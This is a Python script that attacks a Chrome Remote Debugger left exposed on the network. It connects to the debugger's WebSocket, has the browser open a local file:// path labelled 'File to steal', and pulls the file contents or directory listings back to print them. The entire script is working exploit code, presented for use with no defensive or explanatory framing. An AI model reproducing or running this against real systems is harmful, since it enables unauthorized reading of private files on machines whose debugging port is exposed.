import sys
import websockets
import argparse
import requests
import asyncio
import json
from itertools import islice
import pandas as pd

argParser = argparse.ArgumentParser("Description read files accessible to a user running Chrome Remote Debugger")
argParser.add_argument("-i", "--ip", help="IP Address remote debugger is listening on")
argParser.add_argument("-p", "--port", help="Port remote debugger is listening on")
argParser.add_argument("-f", "--file", help="File to steal")
argParser.add_argument("-s", "--secure", action="store_true",help="Use https")

args = argParser.parse_args()

websocket_url = requests.get(f'http{"s" if args.secure else ""}://{args.ip}:{args.port}/json').json()[0]['webSocketDebuggerUrl']

async def exploit():
    async with websockets.connect(websocket_url) as websocket:
        request_string = f'{{"id": 1,"method": "Page.navigate","params": {{"url": "file://{args.file}"}}}}'
        print(f'Requesting {args.file} with {request_string}')
        await websocket.send(request_string)
        init_response = await websocket.recv()
        print(init_response)

        file_request = f'{{"id":2,"method":"Runtime.evaluate","params":"document.documentElement.outerHTML"}}'
        print(f'Downloading {args.file} by sending {file_request}')
        await websocket.send(f'{{"id":2,"method":"Runtime.evaluate","params":{{"expression":"document.documentElement.outerHTML"}}}}')
        file_response = await websocket.recv()

        response_json = json.loads(file_response)
        response_html = ''
        if response_json['result']['result']['type'] != 'string':
            print('Chrome sent the following unsupported response:')
            print(json.dumps(response_json))
            exit()
        else:
            response_html = response_json['result']['result']['value']
            print(response_html)

        if response_html == "<html><head></head><body></body></html>":
            print("File could not be accessed due to insufficient permissions or file not existing, closing connection.")
            await websocket.close()
            exit()
        elif "onHasParentDirectory();" in response_html:
            entries = response_html.splitlines()[2:-1]
            output = []
            for row in entries:
                data = row.replace('<script>addRow(','').replace(');</script>','').split(',')
                output.append([data[0],f'{data[2]},{data[3]} bytes({data[4]})',f'{data[6]} {data[7] if 7 < len(data) else ""}'])
            table = pd.DataFrame(output, columns = ['File Name', 'size', 'date'])
            pd.set_option('display.max_rows', None)
            table.style.set_properties(**{'text-align': 'left'})
            print(table)
        else:
            file = response_html.split("<pre style=\"word-wrap: break-word; white-space: pre-wrap;\">")[1].split("\n</pre>")[0]

            print(file)

            print("Closing Connection")

            await websocket.close()

if __name__ == "__main__":
    asyncio.run(exploit())
